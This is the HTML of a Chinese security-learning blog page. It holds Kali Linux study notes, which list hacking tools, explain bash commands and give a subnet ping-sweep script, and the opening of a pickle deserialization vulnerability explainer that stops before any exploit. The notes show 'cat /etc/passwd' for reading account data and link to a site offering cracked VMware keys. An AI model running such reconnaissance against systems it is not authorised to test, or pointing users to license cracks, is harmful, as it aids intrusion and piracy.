<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"tianliuyun.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="花有重开日，人无再少年">
<meta property="og:type" content="website">
<meta property="og:title" content="花与剑">
<meta property="og:url" content="https://tianliuyun.github.io/index.html">
<meta property="og:site_name" content="花与剑">
<meta property="og:description" content="花有重开日，人无再少年">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Derait">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://tianliuyun.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>花与剑</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">花与剑</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/11/Untitled/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/11/Untitled/" class="post-title-link" itemprop="url">Kali Linux学习笔记(2)——Kali安装</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-11 21:49:00" itemprop="dateCreated datePublished" datetime="2021-08-11T21:49:00+08:00">2021-08-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-12 23:02:20" itemprop="dateModified" datetime="2021-08-12T23:02:20+08:00">2021-08-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index"><span itemprop="name">Kali</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>参考课程：安全牛——Kali Linux渗透测试课程</p>
</blockquote>
<h2 id="002-Kali-Linux-安装"><a href="#002-Kali-Linux-安装" class="headerlink" title="002 Kali Linux 安装"></a>002 Kali Linux 安装</h2><blockquote>
<p>官网：<a target="_blank" rel="noopener" href="https://www.kali.org/">https://www.kali.org/</a></p>
</blockquote>
<h3 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h3><ul>
<li>下载安装镜像：<a target="_blank" rel="noopener" href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></li>
<li>验证hash值</li>
<li>制作启动光盘</li>
<li>制作启动u盘</li>
<li>设置BIOS启动顺序——让u盘优先启动</li>
<li>启动安装</li>
</ul>
<h3 id="持久加密USB安装"><a href="#持久加密USB安装" class="headerlink" title="持久加密USB安装"></a>持久加密USB安装</h3><p>(略)</p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>根据docker官网上的命令下载安装即可</p>
<p><a target="_blank" rel="noopener" href="https://hub.docker.com/u/kalilinux/">https://hub.docker.com/u/kalilinux/</a></p>
<h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><h4 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h4><p><a target="_blank" rel="noopener" href="https://images.kali.org/virtual-images/kali-linux-2021.2-vmware-amd64.7z">https://images.kali.org/virtual-images/kali-linux-2021.2-vmware-amd64.7z</a></p>
<p>下载后解压到kali2021.2，用VMware打开.vmx文件</p>
<p>默认账户密码</p>
<pre class="line-numbers language-none"><code class="language-none">kali
kali<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.aiweibk.com/203582.html">vmware 16最新密钥序列号-vmware workstation 16许可证密钥下载 v16.0.0(附安装破解教程) - 艾薇下载站</a></p>
<h4 id="VirtualBox"><a href="#VirtualBox" class="headerlink" title="VirtualBox"></a>VirtualBox</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33336310/article/details/105456266">https://blog.csdn.net/qq_33336310/article/details/105456266</a></p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Riiiiiysl/articles/14528691.html">Kali2021改中文 - Riiiiiysl - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42672685/article/details/119144458">Kali-Linux-2021.2更改默认root密码_玩电脑的辣条哥的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ywnz.com/linuxxz/9396.html">Kali Linux 2021.2发布下载，附主要更新介绍及升级方法_Linux下载_云网牛站</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46017292/article/details/116189713">Kali2021修改更新源_星辰Again的博客-CSDN博客_kali2021更新源</a></p>
</blockquote>
<h2 id="003-熟悉环境"><a href="#003-熟悉环境" class="headerlink" title="003 熟悉环境"></a>003 熟悉环境</h2><h4 id="Top-10-安全工具"><a href="#Top-10-安全工具" class="headerlink" title="Top 10 安全工具"></a>Top 10 安全工具</h4><ul>
<li>aircrak-ng——无线wifi工具</li>
<li>burpsuite——基于web的渗透测试工具(手动)，截断型代理，通过截断客户端发送的请求，变更数据，根据服务器返回信息判断是否存在安全漏洞</li>
<li>hydra——密码破解</li>
<li>john——密码破解</li>
<li>maltego——图形化界面，根据目标系统有限信息进行信息收集</li>
<li>metasploit framework——★★★渗透测试框架，黑客必备★★★</li>
<li>nmap——著名的网络扫描工具(黑客帝国曾出现过)</li>
<li>owasp-zap——基于web的渗透测试工具(和burpsuite同类)</li>
<li>sqlmap——sql注入工具，基于python语言开发</li>
<li>wireshark——抓包分析工具</li>
</ul>
<h4 id="字体调整"><a href="#字体调整" class="headerlink" title="字体调整"></a>字体调整</h4><pre class="line-numbers language-none"><code class="language-none">apt-get install gnome-tweak-tool
gnome-tweaks tool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h4 id="监视网络流量"><a href="#监视网络流量" class="headerlink" title="监视网络流量"></a>监视网络流量</h4><pre class="line-numbers language-none"><code class="language-none">apt-get  install gnome-applets-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后在工具栏单击右键——面板——添加新项目——网络监视器</p>
<p>此时在工具栏新生成了一个”网络”，这就是我们的网络监视器了。右键单击设置属性</p>
<p>根据网卡设置网络设备，我这里是<code>eth0</code>，其他根据自己的偏好设置</p>
<h4 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h4><ul>
<li><p><strong>bin</strong></p>
<p>所有用户都可以使用的执行程序的目录</p>
</li>
<li><p><strong>boot</strong></p>
<p>引导程序配置文件存放</p>
</li>
<li><p><strong>dev</strong></p>
<p>存放所有的设备目录</p>
</li>
<li><p><strong>etc</strong></p>
<p>存放配置文件的目录(主要)</p>
</li>
<li><p><strong>home</strong></p>
<p>用户的主目录</p>
</li>
<li><p><strong>lib</strong></p>
<p>各种库文件</p>
</li>
<li><p><strong>lost+found</strong></p>
<p>出现问题的错误、丢失文件目录</p>
</li>
<li><p><strong>media</strong></p>
<p>默认挂载外界设备的目录</p>
</li>
<li><p><strong>mnt</strong></p>
<p>以前版本的挂载外界设备的目录</p>
</li>
<li><p><strong>opt</strong></p>
<p>应用程序目录</p>
</li>
<li><p><strong>proc</strong></p>
<p>存在于内存中，启动过程中生成，里面存放大量当前linux的配置参数，可以修改其中文件的配置实现对系统配置的修改</p>
</li>
<li><p><strong>root</strong></p>
<p>root用户的主目录</p>
</li>
<li><p><strong>sbin</strong></p>
<p>只有管理员才有权限执行的程序的目录</p>
</li>
<li><p><strong>tmp</strong></p>
<p>临时目录</p>
</li>
<li><p><strong>usr</strong></p>
<p>执行程序，共享文件</p>
</li>
<li><p><strong>var</strong></p>
<p>存放日志等经常变化内容的目录</p>
</li>
</ul>
<h4 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/call-me-dasheng/p/12771473.html">https://www.cnblogs.com/call-me-dasheng/p/12771473.html</a></p>
<h2 id="004-熟悉BASH命令"><a href="#004-熟悉BASH命令" class="headerlink" title="004 熟悉BASH命令"></a>004 熟悉BASH命令</h2><blockquote>
<p>shell——操作系统与人之间的接口</p>
</blockquote>
<h4 id="常用的bash命令"><a href="#常用的bash命令" class="headerlink" title="常用的bash命令"></a>常用的bash命令</h4><h5 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h5><p>列出当前目录内容<br>红色——压缩包，蓝色——目录，白色——文件，绿色——可执行程序</p>
<pre class="line-numbers language-none"><code class="language-none">ls -l  
#列出当前目录文件详细信息
#开头: d是文件夹，-是文件，c表示设备文件，l表示这是一个链接，b表示块设备(如硬盘)
drwxr-xr-x  2 tian tian     4096 11月 17  2020 公共
drwxr-xr-x  2 tian tian     4096 11月 17  2020 模板
drwxr-xr-x  2 tian tian     4096 11月 17  2020 视频
drwxr-xr-x  2 tian tian     4096 11月 17  2020 图片
drwxr-xr-x  2 tian tian     4096  8月  5 22:26 文档
drwxr-xr-x  2 tian tian     4096  4月 29 14:47 下载
drwxr-xr-x  2 tian tian     4096 11月 17  2020 音乐
drwxr-xr-x 24 tian tian     4096  8月 10 12:59 桌面
ls -a 
#显示包括隐藏文件在内的文件
#linux中.开头的均为隐藏文件
ls -lh
#以人类容易阅读的方式显示
#可以看到文件大小(以常用单位)
ls -lh --sort&#x3D;size
#按照大小排序从大到小显示
ls -lh --sort&#x3D;time
#按照修改时间从近到远显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="cd、pwd"><a href="#cd、pwd" class="headerlink" title="cd、pwd"></a>cd、pwd</h5><pre class="line-numbers language-none"><code class="language-none">cd .. #转到上一级目录
pwd #查看当前工作目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h5 id="cat、more、tail"><a href="#cat、more、tail" class="headerlink" title="cat、more、tail"></a>cat、more、tail</h5><pre class="line-numbers language-none"><code class="language-none">cat xxx #显示xxx文件内容
cat &#x2F;etc&#x2F;passwd #显示所有账号
more xxx #显示xxx文件内容(当显示的内容满了终端时会等待回车才查看下一屏)(显示当前屏占文件总数的百分比)
less xxx #显示xxx文件内容(当显示的内容满了终端时会等待回车才查看下一屏)
tail -? xxx #显示xxx文件最下面?行(默认为10行)
watch -n ? xxx #每隔?秒显示一次xxx文件的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="cp、rm"><a href="#cp、rm" class="headerlink" title="cp、rm"></a>cp、rm</h5><pre class="line-numbers language-none"><code class="language-none">rm xxx #删除xxx文件
rm -r xxx #删除xxx文件夹
cp ps ps1 #复制ps为ps1
cp -r agent&#x2F; a #复制agent文件夹为a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="top、ps"><a href="#top、ps" class="headerlink" title="top、ps"></a>top、ps</h5><pre class="line-numbers language-none"><code class="language-none">top #监视linux系统，实时信息
#在该界面按下k，再输入进程的pid，回车，即可杀死对应进程
#按下q退出
ps #查看进程信息
ps -ef #查看进程详细信息
ps aux #与前一个命令相比，显示的列信息有所不同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h5><pre class="line-numbers language-none"><code class="language-none">grep ? xxx #只显示xxx文件中带有?的行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h5><pre class="line-numbers language-none"><code class="language-none">ifconfig #查看当前的网络配置信息ifconfig eth0 down #结束网卡ethoifconfig eth0 up #启动网卡etho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="netstat、awk、sort"><a href="#netstat、awk、sort" class="headerlink" title="netstat、awk、sort"></a>netstat、awk、sort</h5><pre class="line-numbers language-none"><code class="language-none">netstat -pantu #查看当前计算机的网络产生了哪些tdp、udp连接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h5><pre class="line-numbers language-none"><code class="language-none">mount #查看挂载目录的信息mount -o loop kali.iso &#x2F;media&#x2F;cdrom #将kali.iso挂载到&#x2F;media&#x2F;cdrom目录下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="dmesg"><a href="#dmesg" class="headerlink" title="dmesg"></a>dmesg</h5><pre class="line-numbers language-none"><code class="language-none">dmesg #查看开机信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name nmap #在根目录下查找namp文件find &#x2F; -iname nmap #在根目录下查找namp文件(包括大写)find . -name &quot;ps*&quot; #查找当前目录下以ps开头的文件find . -name &quot;ps*&quot; -exec cp &#123;&#125; &#x2F;tmp&#x2F;&#123;&#125;.bak \; #查找当前目录下以ps开头的文件，并拷贝到tmp文件夹下，并以.bak作为后缀<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h5><pre class="line-numbers language-none"><code class="language-none">whereis nmap #查找 通过操作系统的包管理工具 下载的名为nmap的文件(通过一个数据库)updatedb #更新上述数据库whereis -b nmap #查找名为nmap的二进制文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h5><pre class="line-numbers language-none"><code class="language-none">echo &quot;hello world&quot; #输出hello world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h5><pre class="line-numbers language-none"><code class="language-none">vi 1.txt     #编辑1.txt，若不存在该文件则创建#以下为进入vi界面后的操作:set number  #设置行标号:wq 		 #保存并退出:wq! 		 #强制保存并退出i			 #进入编辑模式，按esc退出dd 			 #删除光标所在行o 			 #在光标处下面插入一行，并进入编辑模式，按esc退出y			 #复制当前行p			 #将y复制的内容粘贴<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>将多个命令在同一行中输入</p>
<pre class="line-numbers language-none"><code class="language-none">netstat -pantu | egrep -v &#39;0.0.0.0|:::&#39; | awk &#39;&#123;print $5&#125;&#39; | egrep -v &#39;and|Address&#39; | cut -d &#39;:&#39; -f 1 | sort | uniq &gt; ip#查看当前计算机的网络产生了哪些tdp、udp连接-&gt;过滤0.0.0.0|:::-&gt;只输出第五列-&gt;过滤and|Address-&gt;用:分割成块后输出第一块-&gt;排序-&gt;去重-&gt;重定向输出至文件名为ip的文件netstat -pantu | egrep -v &#39;0.0.0.0|:::&#39; | awk &#39;&#123;print $5&#125;&#39; | egrep -v &#39;and|Address&#39; | cut -d &#39;:&#39; -f 1 | sort | uniq &gt;&gt; ip#前面不变，最后&gt;&gt;表示追加信息至ip文件中cat &#x2F;etc&#x2F;passwd | grep ssl	#输出&#x2F;etc&#x2F;passwd文件的内容-&gt;只输出包含ssl的行cat aaa &amp; ls	#依次执行两个命令cat aaa &amp;&amp; ls	#前面命令执行成功才执行后面的命令cat aaa || ls	#前面命令执行失败才执行后面的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h4><pre class="line-numbers language-none"><code class="language-none">vi 1.shchmod +x 1.sh.&#x2F;1.sh#以下shell脚本皆如此构建<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="1-sh"><a href="#1-sh" class="headerlink" title="1.sh"></a>1.sh</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bashecho -n "IP: "read $ipecho "your ip is:" $ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="99-sh"><a href="#99-sh" class="headerlink" title="99.sh"></a>99.sh</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bashfor n in `seq 9`do for m in `seq $n` do  echo -n "$m*$n=" `expr $m \* $n`"		" done echodone</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h5 id="ping-sh"><a href="#ping-sh" class="headerlink" title="ping.sh"></a>ping.sh</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bashfor n in `seq 254`do ping 192.168.1.$n -c 1 | grep ttl | awk '&#123;print $4&#125;' | awk -F: '&#123;print $1&#125;'done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/07/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/07/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/" class="post-title-link" itemprop="url">pickle 反序列化漏洞浅析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-07 15:14:00 / 修改时间：15:24:38" itemprop="dateCreated datePublished" datetime="2021-08-07T15:14:00+08:00">2021-08-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Pickle库及函数"><a href="#Pickle库及函数" class="headerlink" title="Pickle库及函数"></a>Pickle库及函数</h2><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。<br>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dumps</td>
<td align="center">对象反序列化为bytes对象</td>
</tr>
<tr>
<td align="center">dump</td>
<td align="center">对象反序列化到文件对象，存入文件</td>
</tr>
<tr>
<td align="center">loads</td>
<td align="center">从bytes对象反序列化</td>
</tr>
<tr>
<td align="center">load</td>
<td align="center">对象反序列化，从文件中读取数据</td>
</tr>
</tbody></table>
<p>先通过几个例子来看下这几个函数的作用：</p>
<p><strong>dump/load</strong></p>
<pre class="line-numbers language-none"><code class="language-none">#序列化
pickle.dump(obj, file, protocol&#x3D;None,)
obj表示要进行封装的对象(必填参数）
file表示obj要写入的文件对象
以二进制可写模式打开即wb(必填参数）
#反序列化
pickle.load(file, *, fix_imports&#x3D;True, encoding&#x3D;&quot;ASCII&quot;, errors&#x3D;&quot;strict&quot;, buffers&#x3D;None)
file文件中读取封存后的对象
以二进制可读模式打开即rb(必填参数)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import os
import pickle

class orange(object):
    def __init__(self,a,b):
        self.a &#x3D; a
        self.b &#x3D; b

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    orange1 &#x3D; orange(&#39;1&#39;,&#39;2&#39;)
    print orange1
    print &quot;\n&quot;
    file1 &#x3D; open(&#39;11.txt&#39;,&#39;wb&#39;)
    pickle.dump(orange1,file1)
    file1.close()
    
	os.system(&quot;cat 11.txt&quot;)
    
    file2 &#x3D; open(&#39;11.txt&#39;,&#39;rb&#39;)
    data &#x3D; pickle.load(file2)
    file2.close()
	print &quot;\n&quot;
    print data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>dumps/loads</strong></p>
<pre class="line-numbers language-none"><code class="language-none">#序列化
pickle.dumps(obj, protocol&#x3D;None,*,fix_imports&#x3D;True)
dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
#反序列化
pickle.loads(bytes_object, *,fix_imports&#x3D;True, encoding&#x3D;&quot;ASCII&quot;. errors&#x3D;&quot;strict&quot;)
loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import os
import pickle

class orange(object):
    def __init__(self,a,b):
        self.a &#x3D; a
        self.b &#x3D; b

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    orange1 &#x3D; orange(&#39;1&#39;,&#39;2&#39;)
    print orange1
    print &quot;\n&quot;
    strings &#x3D; pickle.dumps(orange1)
    print strings
    print &quot;\n&quot;
    data &#x3D; pickle.loads(strings)
    print(data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>两个python2脚本的执行结果是一样的</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;__main__.orange object at 0x7fae5772cf90&gt;


ccopy_reg
_reconstructor
p0
(c__main__
orange
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
S&#39;a&#39;
p6
S&#39;1&#39;
p7
sS&#39;b&#39;
p8
S&#39;2&#39;
p9
sb.


&lt;__main__.orange object at 0x7fae57732050&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>python2</code>中以字符串的形式进行转换时，这些序列化的字符串是什么意思，又按照什么规则生成的，这就涉及到了PVM，因为它是<code>Python</code>序列化过程和反序列化过程中最根本的东西。</p>
<h2 id="PVM-Python-Virtual-Machine"><a href="#PVM-Python-Virtual-Machine" class="headerlink" title="PVM(Python Virtual Machine)"></a>PVM(Python Virtual Machine)</h2><p>一般来说,我们讨论Python,是将其作为一门编程语言来详解.但是,从实际情况来看,Python也是一个名为解释器的软件包.解释器是可以让程序运行起来一套程序,具有独立性.所以当你写了一段代码之后,Python解释器读取程序,将其转化为命令执行,得出结果.<br>总的来说,解释器就是代码与计算机硬件之间的软件逻辑层.</p>
<h3 id="PVM的作用"><a href="#PVM的作用" class="headerlink" title="PVM的作用"></a>PVM的作用</h3><p>对于Python而言，它可以直接从源代码运行程序。Python解释器会将源代码编译为字节码，然后将编译后的字节码转发到Python虚拟机中执行。总的来说，PVM的作用便是用来解释字节码的解释引擎。</p>
<h3 id="PVM的执行流程"><a href="#PVM的执行流程" class="headerlink" title="PVM的执行流程"></a>PVM的执行流程</h3><p>当运行Python程序时，PVM会执行两个步骤。</p>
<ol>
<li><p><code>PVM</code>会把源代码编译成字节码</p>
<blockquote>
<p>字节码是Python特有的一种表现形式，不是二进制机器码，需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 .pyc 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .</p>
</blockquote>
</li>
<li><p><code>Python</code>进程会把编译好的字节码转发到<code>PVM（Python虚拟机）</code>中，<code>PVM</code>会循环迭代执行字节码指令，直到所有操作被完成。</p>
</li>
</ol>
<h3 id="PVM与Pickle模块的关系"><a href="#PVM与Pickle模块的关系" class="headerlink" title="PVM与Pickle模块的关系"></a>PVM与Pickle模块的关系</h3><blockquote>
<p>Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</p>
</blockquote>
<p>这个轻量级的PVM由三部分组成及其功能如下：</p>
<ul>
<li>指令处理器( Instruction processor )</li>
</ul>
<blockquote>
